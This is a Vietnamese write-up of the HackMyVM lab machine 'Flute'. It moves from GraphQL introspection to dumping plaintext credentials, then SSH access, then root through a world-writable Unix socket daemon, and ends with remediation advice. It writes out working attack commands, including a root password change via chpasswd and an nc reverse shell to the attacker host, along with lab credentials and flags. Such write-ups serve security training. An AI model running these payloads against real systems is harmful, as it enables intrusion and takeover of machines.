# HackMyVM — Flute

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy Flute (Target) | `10.0.2.12` |
| SSH | `22/tcp` — OpenSSH |
| GraphQL (Apollo) | `8888/tcp` |
| User SSH | `hamelin` / `comewithmerats` |
| User (khác) | `admin` / `imtherealadmin` |
| PrivEsc | Unix socket `/tmp/ratd.sock` → daemon root `ratd.py` |
| OS | Alpine Linux |

> **Quy ước**
>
> - 🟦 **Terminal Kali**: recon, GraphQL, SSH.
> - 🟥 **Trên Target**: enum, exploit socket, lấy flag.
>
> Đặt biến:

```bash
ip=10.0.2.12
kali=10.0.2.15
```

---

# 1. Câu 1 — Khảo sát hệ thống

## 1.1. Xác định IP và quét cổng

### 🟦 Kali

```bash
ip=10.0.2.12
ping -c 4 $ip

nmap -p- -Pn -T4 --min-rate 5000 $ip
nmap -p 22,8888 -sCV -Pn -T4 $ip
```

Kết quả mong đợi:

```text
22/tcp   open  ssh
8888/tcp open  http   (Apollo GraphQL — "query missing")
```

Port 8888 trả `query missing` + CORS `Access-Control-Allow-Origin: *` → GraphQL API.

---

## 1.2. Xác nhận Apollo GraphQL

```bash
curl -s http://$ip:8888/ | head -40
```

Thấy landing page Apollo Server, `isProd: false` → introspection thường được bật.

---

## 1.3. GraphQL Introspection

### Liệt kê types

```bash
curl -s -X POST http://$ip:8888/ \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | python3 -m json.tool
```

Có type **`User`**.

### Fields của User

```bash
curl -s -X POST http://$ip:8888/ \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name } } }"}' | python3 -m json.tool
```

Kết quả:

```json
"fields": [{"name":"username"},{"name":"password"}]
```

→ Password plaintext qua API.

### Query operations

```bash
curl -s -X POST http://$ip:8888/ \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"Query\") { fields { name } } }"}' | python3 -m json.tool
```

Có: **`users`**, **`user`**.

---

# 2. Câu 2 — Khai thác

## 2.1. Lấy credential qua GraphQL

```bash
curl -s -X POST http://$ip:8888/ \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { username password } }"}' | python3 -m json.tool
```

Kết quả:

```json
{
  "data": {
    "users": [
      {"username": "admin", "password": "imtherealadmin"},
      {"username": "hamelin", "password": "comewithmerats"}
    ]
  }
}
```

---

## 2.2. SSH as hamelin + User flag

```bash
ssh hamelin@10.0.2.12
# Password: comewithmerats
```

### 🟥 Target

```bash
id
uname -a
cat ~/user.txt
# hoặc
cat /home/hamelin/user.txt
```

**User flag** (theo writeup mẫu, flag thực tế có thể khác):

```text
HMVuser9f4ndbaz4chc6j04b3va
```

---

## 2.3. Enum nội bộ — tìm ratd

```bash
ls -la ~
ls -la /opt
ls -la /opt/ratd/
cat /opt/ratd/ratd.py
```

Nội dung quan trọng của `ratd.py`:

```python
# Socket /tmp/ratd.sock với chmod 0777
# Nhận "RUN <cmd>" → os.system(cmd) với quyền root
```

Kiểm tra socket:

```bash
ls -la /tmp/ratd.sock
# srwxrwxrwx ... /tmp/ratd.sock
```

---

## 2.4. Privilege Escalation qua Unix socket

Gửi lệnh đổi password root:

```bash
python3 -c '
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/ratd.sock")
s.send(b"RUN echo \"root:hacked\" | chpasswd\n")
print(s.recv(1024).decode())
s.close()
'
```

Kết quả: `OK`

Đăng nhập root:

```bash
su - root
# Password: hacked

id
cat /root/root.txt
cat /home/hamelin/user.txt
```

**Root flag** (theo writeup mẫu, flag thực tế có thể khác):

```text
flute:~# cat /root/root.txt
HMVrootoepsamqu0liphzzsc7x9
flute:~# cat /home/hamelin/user.txt
HMVuser9f4ndbaz4chc6j04b3va

```

---

## 2.5. Cách khác (reverse shell / đọc file trực tiếp)

```bash
# Đọc root.txt trực tiếp
python3 -c '
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/ratd.sock")
s.send(b"RUN cat /root/root.txt > /tmp/rf.txt\n")
print(s.recv(1024).decode())
s.close()
'
cat /tmp/rf.txt
```

Hoặc reverse shell về Kali:

```bash
# Kali: nc -lvnp 4444
python3 -c '
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/ratd.sock")
s.send(b"RUN nc 10.0.2.15 4444 -e /bin/sh\n")
print(s.recv(1024).decode())
s.close()
'
```

*(Alpine có thể dùng `busybox nc` tùy build.)*

---

## 2.6. Chuỗi khai thác

```text
┌────────────────────────┐
│ 🟦 KALI 10.0.2.15      │
└───────────┬────────────┘
            │ nmap → 22, 8888
            ▼
┌────────────────────────┐
│ GraphQL Apollo :8888   │
│ Introspection ON       │
│ User {username,password}│
└───────────┬────────────┘
            │ { users { username password } }
            ▼
┌────────────────────────┐
│ hamelin:comewithmerats │
│ SSH → user flag        │
└───────────┬────────────┘
            │ /opt/ratd/ratd.py
            │ /tmp/ratd.sock (0777)
            ▼
┌────────────────────────┐
│ RUN echo root:hacked   │
│ | chpasswd             │
│ su root → root flag    │
└────────────────────────┘
```

---

## 2.7. Lệnh copy-paste nhanh

```bash
# ===== 0. Chuẩn bị =====
ip=10.0.2.12

# ===== 1. Recon =====
nmap -p 22,8888 -sCV -Pn -T4 $ip
curl -s http://$ip:8888/ | head -20

# ===== 2. GraphQL =====
curl -s -X POST http://$ip:8888/ -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | python3 -m json.tool

curl -s -X POST http://$ip:8888/ -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name } } }"}' | python3 -m json.tool

curl -s -X POST http://$ip:8888/ -H "Content-Type: application/json" \
  -d '{"query":"{ users { username password } }"}' | python3 -m json.tool
# → hamelin:comewithmerats

# ===== 3. SSH =====
ssh hamelin@$ip
# Password: comewithmerats
# cat user.txt

# ===== 4. PrivEsc (trên target) =====
cat /opt/ratd/ratd.py
ls -la /tmp/ratd.sock

python3 -c '
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/ratd.sock")
s.send(b"RUN echo \"root:hacked\" | chpasswd\n")
print(s.recv(1024).decode())
s.close()
'

su - root
# Password: hacked
# cat /root/root.txt
```

---

# 3. Câu 3 — Khắc phục

## 3.1. Nguyên nhân

1. GraphQL introspection bật trên production + field `password` plaintext.
2. Không auth trên query `users`.
3. Daemon `ratd.py` chạy root, socket `0777`, `os.system()` không lọc input.

## 3.2. Biện pháp

- Tắt introspection trên production (`introspection: false`).
- Không expose password qua GraphQL; hash password, không trả về client.
- Auth + authorization cho mọi query nhạy cảm.
- Socket chỉ quyền cần thiết (ví dụ `0600`, owner root), không world-writable.
- Không dùng `os.system()` với input từ socket; whitelist lệnh hoặc bỏ daemon kiểu này.
- Least privilege: daemon không chạy root nếu không bắt buộc.

---

# Kết luận ngắn gọn

## Câu 1

```text
22/tcp SSH | 8888/tcp Apollo GraphQL
Introspection → User {username, password}
```

## Câu 2

```text
{ users { username password } }
→ hamelin:comewithmerats → SSH → user flag
/tmp/ratd.sock + RUN chpasswd → su root → root flag
```

## Câu 3

```text
Tắt introspection + không lộ password
Socket/daemon không world-writable + không os.system tùy ý
```
